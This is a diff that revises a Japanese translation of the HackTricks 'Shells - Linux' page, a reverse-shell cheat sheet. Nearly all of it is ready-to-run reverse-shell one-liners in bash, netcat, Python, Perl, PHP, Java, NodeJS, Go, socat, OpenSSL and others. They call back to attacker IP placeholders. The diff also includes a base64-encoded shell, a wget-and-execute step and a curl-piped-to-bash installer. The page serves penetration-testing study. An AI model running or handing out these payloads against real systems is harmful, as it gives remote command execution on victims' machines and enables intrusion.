@@ -1,18 +1,19 @@
-# シェル - Linux
+# Shells - Linux
+
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>**でゼロからヒーローまでAWSハッキングを学ぶ**</strong></a><strong>！</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-HackTricks をサポートする他の方法:
-
-* **HackTricks で企業を宣伝したい**または**HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
-* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)または[**telegram グループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**する
-* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出**してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -22,11 +23,11 @@ HackTricks をサポートする他の方法:
 
 ***
 
-**これらのシェルに関する質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com) **で確認できます**
+**これらのシェルについて質問がある場合は、** [**https://explainshell.com/**](https://explainshell.com) **を確認してください。**
 
-## フルTTY
+## Full TTY
 
-**逆シェルを取得したら、[**このページを読んでフルTTYを取得**](full-ttys.md)**してください。**
+**リバースシェルを取得したら、**[ **フルTTYを取得するためにこのページを読んでください**](full-ttys.md)**。**
 
 ## Bash | sh
 ```bash
@@ -41,9 +42,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### シンボルセーフシェル
+他のシェルも確認することを忘れないでください: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, および bash。
 
-他のシェルもチェックすることを忘れないでください：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh、およびbash。
+### シンボルセーフシェル
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -52,26 +53,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### シェルの説明
+#### Shellの説明
 
-1. **`bash -i`**: このコマンドの部分は、インタラクティブ(`-i`)なBashシェルを開始します。
-2. **`>&`**: このコマンドの部分は、**標準出力（`stdout`）と標準エラー（`stderr`）を同じ宛先にリダイレクト**するための短縮表記です。
-3. **`/dev/tcp/<攻撃者のIP>/<ポート>`**: これは、指定されたIPアドレスとポートへのTCP接続を表す特別なファイルです。
-* **出力とエラーストリームをこのファイルにリダイレクト**することで、コマンドはインタラクティブシェルセッションの出力を攻撃者のマシンに送信します。
-4. **`0>&1`**: このコマンドの部分は、**標準入力（`stdin`）を標準出力（`stdout`）と同じ宛先にリダイレクト**します。
+1. **`bash -i`**: このコマンドの部分は、インタラクティブな（`-i`）Bashシェルを開始します。
+2. **`>&`**: このコマンドの部分は、**標準出力**（`stdout`）と**標準エラー**（`stderr`）を**同じ宛先**にリダイレクトするための省略記法です。
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: これは、**指定されたIPアドレスとポートへのTCP接続を表す特別なファイル**です。
+* **出力とエラーストリームをこのファイルにリダイレクトすることによって**、コマンドはインタラクティブシェルセッションの出力を攻撃者のマシンに送信します。
+4. **`0>&1`**: このコマンドの部分は、**標準入力（`stdin`）を標準出力（`stdout`）と同じ宛先にリダイレクトします**。
 
 ### ファイルを作成して実行
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## フォワードシェル
+## Forward Shell
 
-LinuxベースのWebアプリケーション内の**Remote Code Execution (RCE)**脆弱性を処理する際、逆シェルを達成することがiptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。そのような制約のある環境では、より効果的に侵害されたシステムとやり取りするためにPTY（擬似端末）シェルを確立する代替手段があります。
+Linuxベースのウェブアプリケーション内の**Remote Code Execution (RCE)** 脆弱性に対処する際、リバースシェルの取得はiptablesルールや複雑なパケットフィルタリングメカニズムなどのネットワーク防御によって妨げられることがあります。このような制約のある環境では、PTP（擬似端末）シェルを確立して、侵害されたシステムとより効果的に対話する代替アプローチが含まれます。
 
-この目的のための推奨ツールは、[toboggan](https://github.com/n3rada/toboggan.git)であり、これにより対象環境とのやり取りが簡素化されます。
+この目的に推奨されるツールは [toboggan](https://github.com/n3rada/toboggan.git) で、ターゲット環境との対話を簡素化します。
 
-tobogganを効果的に利用するには、対象システムのRCEコンテキストに合わせたPythonモジュールを作成します。例えば、`nix.py`という名前のモジュールは次のように構造化される可能性があります。
+tobogganを効果的に利用するには、ターゲットシステムのRCEコンテキストに合わせたPythonモジュールを作成します。例えば、`nix.py`という名前のモジュールは次のように構成できます：
 ```python3
 import jwt
 import httpx
@@ -99,17 +100,17 @@ return response.text
 ```shell
 toboggan -m nix.py -i
 ```
-直接インタラクティブシェルを活用するには、Burpsuite統合のために`-b`を追加し、より基本的なrceラッパーにするために`-i`を削除できます。
+直接インタラクティブシェルを利用するには、Burpsuite統合のために`-b`を追加し、より基本的なrceラッパーのために`-i`を削除できます。
 
-別の可能性は、`IppSec`のフォワードシェル実装[**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)を使用することです。
+別の可能性として、`IppSec`のフォワードシェル実装を使用することができます [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)。
 
-次のように変更する必要があります：
+次の項目を修正する必要があります：
 
-- 脆弱なホストのURL
-- ペイロードの接頭辞と接尾辞（あれば）
-- ペイロードの送信方法（ヘッダー？データ？追加情報？）
+* 脆弱なホストのURL
+* ペイロードのプレフィックスとサフィックス（ある場合）
+* ペイロードの送信方法（ヘッダー？データ？追加情報？）
 
-その後、**コマンドを送信**したり、**`upgrade`コマンドを使用**して完全なPTYを取得したりできます（パイプは約1.3秒の遅延で読み取られ、書き込まれることに注意してください）。
+その後、**コマンドを送信**するか、**`upgrade`コマンドを使用**してフルPTYを取得できます（パイプは約1.3秒の遅延で読み書きされることに注意してください）。
 
 ## Netcat
 ```bash
@@ -121,13 +122,11 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## gsocket
 
-[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)で確認してください。
+[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/) で確認してください。
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
-## Telnet
-
-Telnetは、ネットワーク上でコンピューターにアクセスするためのプロトコルです。通常、Telnetを使用してリモートシステムに接続し、コマンドを実行することができます。 Telnetは、セキュリティ上のリスクがあるため、代わりにSSHなどのより安全なプロトコルを使用することが推奨されています。
+## テルネット
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -140,16 +139,12 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-**被害者**
+コマンドを送信するには、書き込み、エンターを押し、CTRL+Dを押します（STDINを停止するため）。
 
-```bash
-コマンドを書き込んで、Enter キーを押し、CTRL+D キーを押してください（STDIN を停止するため）
-```
+**被害者**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
-## Python
-
 ## パイソン
 ```bash
 #Linux
@@ -158,9 +153,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 #IPv6
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
-## Perl
-
-Perlは、多くのLinuxシステムでデフォルトでインストールされているスクリプト言語です。Perlスクリプトを使用することで、シェルコマンドと同様にシステムコマンドを実行し、システムリソースにアクセスすることができます。Perlは、シェルスクリプトよりも高度な機能を持ち、複雑なタスクを自動化するのに役立ちます。
+## パール
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -171,8 +164,6 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## PHP
-
-PHP (PHP: Hypertext Preprocessor) は、主にWeb開発に使用されるスクリプト言語です。PHPは、HTMLに埋め込んで使用することができ、データベースとの連携やフォームの処理など、動的なWebページを作成するための機能を提供します。PHPは、サーバーサイドで実行されるため、ユーザーが直接コードを見ることはできません。
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -184,30 +175,22 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
-## Java
-
-Javaは、オブジェクト指向プログラミング言語であり、クロスプラットフォームで動作します。Javaは、セキュリティ、パフォーマンス、および信頼性に焦点を当てて設計されています。Javaは、Webアプリケーション、モバイルアプリケーション、ビッグデータテクノロジーなど、さまざまな用途で広く使用されています。
+## ジャバ
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 ## Ncat
-
-Ncat is a feature-packed networking utility that reads and writes data across networks from the command line. It supports various protocols and offers many advanced features, making it a powerful tool for network debugging and exploration.
 ```bash
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-## Golang
-
-## Golang
+## ゴラン
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
-## Lua
-
-Lua
+## ルア
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -215,8 +198,6 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 ## NodeJS
-
-NodeJSは、非同期イベント駆動のJavaScriptランタイム環境であり、サーバーサイドでのスクリプト実行に適しています。NodeJSは、Webアプリケーションやネットワークアプリケーションの開発に広く使用されています。
 ```javascript
 (function(){
 var net = require("net"),
@@ -261,7 +242,7 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 ## OpenSSL
 
-攻撃者（Kali）
+攻撃者 (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -290,32 +271,24 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
-
-## Awk
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## フィンガー
+## Finger
 
 **攻撃者**
 ```bash
 while true; do nc -l 79; done
 ```
-```
-コマンドを送信するには、それを書き留め、Enter キーを押し、CTRL+D キーを押します（STDIN を停止するため）
+コマンドを送信するには、書き込み、エンターを押し、CTRL+Dを押します（STDINを停止するため）。
 
 **被害者**
-```
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
 ## Gawk
-
-### Gawk
-
-Gawkは、AWKプログラミング言語のGNU実装です。 AWKは、テキストとデータ処理のための強力なプログラミング言語であり、Gawkはその強化バージョンです。 Gawkは、Linuxシェルスクリプト内で使用されることがよくあります。
 ```bash
 #!/usr/bin/gawk -f
 
@@ -340,20 +313,20 @@ close(Service)
 ```
 ## Xterm
 
-これは、ポート6001であなたのシステムに接続しようとします：
+これはポート6001であなたのシステムに接続しようとします:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-逆シェルをキャッチするために使用できる（ポート6001でリッスンする）:
+リバースシェルをキャッチするには、次のコマンドを使用できます（ポート6001でリッスンします）：
 ```bash
 # Authorize host
 xhost +targetip
 # Listen
 Xnest :1
 ```
-## Groovy
+## グルービー
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注意: JavaリバースシェルはGroovyでも動作します
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 注: Java リバースシェルはグルービーでも動作します
 ```bash
 String host="localhost";
 int port=8044;
@@ -373,16 +346,17 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-HackTricksをサポートする他の方法：
-
-* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合は**、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を手に入れる
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
-* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有する
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
+{% endhint %}
